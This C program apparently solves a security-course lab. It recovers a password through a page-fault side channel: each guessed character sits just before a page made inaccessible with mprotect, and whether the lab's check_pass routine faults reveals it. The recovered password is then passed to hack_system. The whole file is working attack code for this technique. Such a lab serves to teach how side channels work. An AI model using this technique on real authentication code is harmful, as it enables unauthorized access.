#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <setjmp.h>

// include our "system" header
#include "sysapp.h"

char *buffer;
char *page_start;
int page_size;

sigjmp_buf jumpout;

void handle_SEGV(int sig_num) {
    siglongjmp(jumpout, 1);
};

int demonstrate_signals(char * charStart) {
    char *buf = page_start;

    // this call arranges that _if_ there is a SEGV fault in the future
    // (anywhere in the program) then control will transfer directly to this
    // point with sigsetjmp returning 1
    if (sigsetjmp(jumpout, 1) == 1)
        return 1; // we had a SEGV

    signal(SIGSEGV, SIG_DFL);
    signal(SIGSEGV, &handle_SEGV);

    // We will now cause a fault to happen
    int ret = check_pass(charStart);
    return ret;
}

int main(int argc, char **argv) {
    char guess[33];
    char c;
    int ok;
    int len;

    // get the physical page size
    page_size = sysconf(_SC_PAGESIZE);

    //
    // allocate the buffer - we need at least 3 pages
    // (because malloc doesn't give us page aligned data)
    //   Page:   1111111111111111222222222222222233333333333333334444444
    //           ^ buffer        ^page_start                    ^ end of buffer
    //   Prot:   ++++++++++++++++----------------+++++++++++++++++++++++
    //
    buffer = (char *) malloc(3 * page_size);
    if (!buffer) {
        perror("malloc failed");
        exit(1);
    };

    // find the page start into buffer
    page_start = buffer + (page_size - ((unsigned long) buffer) % page_size);

    // fix the page start if there is not enough space
    if ((page_start - buffer) <= 32)
        page_start += page_size;

    // prohibit access to the page
    if (mprotect(page_start, page_size, PROT_NONE) == -1) {
        perror("mprotect failed");
    };

    //
    // page_start points to an address
    // that is unmapped (i.e., if memory is accessed at *page_start it
    // will cause a SEGV fault).  Moreover, the 32 characters _before_
    // page_start _are_ guaranteed to be allocated.
    // setting initial guess to zeros
    bzero(guess, sizeof(guess));

    int i;
    int j;
    int flag = 0;

    for (i = 1; i <= 32; i++)
    {
	for (j = 33; j <= 126; j++)
	{
	   char c = (char) j;
	   *(page_start-1) = c;
		
	   int val = demonstrate_signals(page_start-i);

	   if (val == 1)	
	   {
	      break;
	   }
	   else if (val == 0 && j != 126)	
	   { 
	      continue;
	   }
	   else if (val == 0 && j == 126)
	   {
	      flag = 1;
	      break;
	   }
	}	
      	
	if (flag == 1)
	{
	   guess[i-1] = (char) 0;
	   break;
	}

	guess[i-1] = *(page_start-1);

	char * ptr = page_start-i-1;

	while (ptr !=  page_start-1)
	{
	   *ptr = *(ptr+1);
	   ptr = ptr + 1;
	}
    }
	
    guess[32] = (char) 0;	
	
    if (check_pass(guess)) {
        printf("Password Found!\n");
        hack_system(guess);
    };

    printf("Could not get the password!  Last guess was %s\n", guess);
    return 1;
};
